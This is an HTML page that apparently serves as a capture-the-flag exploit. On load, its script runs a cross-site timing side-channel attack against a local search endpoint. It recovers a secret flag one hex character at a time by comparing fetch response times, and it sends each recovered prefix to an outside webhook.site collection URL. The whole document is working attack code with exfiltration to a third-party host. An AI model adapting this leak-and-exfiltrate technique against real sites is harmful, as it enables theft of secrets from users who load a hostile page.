<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Leaky CTF Exploit - Upgraded</title>
</head>
<body>
    <h1>Exploit is running (Upgraded Version)... Check your webhook!</h1>
    <script>
        const WEBHOOK_URL = "https://webhook.site/2579616d-2ffd-46a3-9668-b3e4ea0ccdac/?log=";
        const TARGET = "http://localhost:5000/search?flag=";
        const CHARSET = "0123456789abcdef";
        let known = "leakyctf{";

        // 升級 1：加入 Sleep 函數，用嚟製造 Delay
        const sleep = ms => new Promise(r => setTimeout(r, ms));

        async function measureTime(url) {
            const start = performance.now();
            try {
                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
            } catch (e) {}
            return performance.now() - start;
        }

        async function exploit() {
            // 暖機
            await measureTime(TARGET + "dummy_warmup");
            await sleep(100);

            for (let i = 0; i < 8; i++) { 
                let timings = {};

                for (let char of CHARSET) {
                    let url = TARGET + known + char;
                    let minTime = Infinity;

                    // 升級 2：測試 5 次，並加入冷卻時間
                    for (let j = 0; j < 5; j++) {
                        let t = await measureTime(url);
                        if (t < minTime) minTime = t;
                        
                        // 每次 request 後等 10ms，避免伺服器太 chok 影響準確度
                        await sleep(10); 
                    }
                    timings[char] = minTime;
                }

                let fastestChar = '';
                let minTime = Infinity;

                for (let char of CHARSET) {
                    if (timings[char] < minTime) {
                        minTime = timings[char];
                        fastestChar = char;
                    }
                }

                known += fastestChar;
                fetch(WEBHOOK_URL + known);
            }
            
            fetch(WEBHOOK_URL + "DONE_" + known + "}");
        }

        exploit();
    </script>
</body>
</html>
